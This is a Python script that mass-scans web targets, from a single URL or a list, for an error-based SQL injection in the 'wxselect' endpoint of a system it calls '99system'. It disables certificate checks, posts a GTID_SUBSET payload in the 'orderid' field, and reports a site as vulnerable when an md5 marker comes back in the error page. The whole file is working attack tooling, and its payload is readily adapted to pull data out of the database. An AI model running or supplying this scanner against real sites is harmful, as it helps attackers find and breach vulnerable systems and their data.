import requests
import urllib3
from urllib.parse import urljoin,quote
import argparse
import ssl
import re
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = urljoin(url, "/group/index/wxselect")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "orderid=') AND GTID_SUBSET(CONCAT((MID((IFNULL(CAST(md5(123456) AS NCHAR),0x7e)),1,190))),1)--+"
    try:
        response = requests.post(target,verify=False, headers=headers,timeout=25,data=data)
        if response.status_code == 500 and 'SQLSTA' in response.text and 'e10adc3949ba59abbe56e057f20f883e' in response.text:
            print(f"\033[31mDiscovered:{url}: 99system_wxselect_SQLInject!\033[0m")
            return True
    except Exception as e:
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")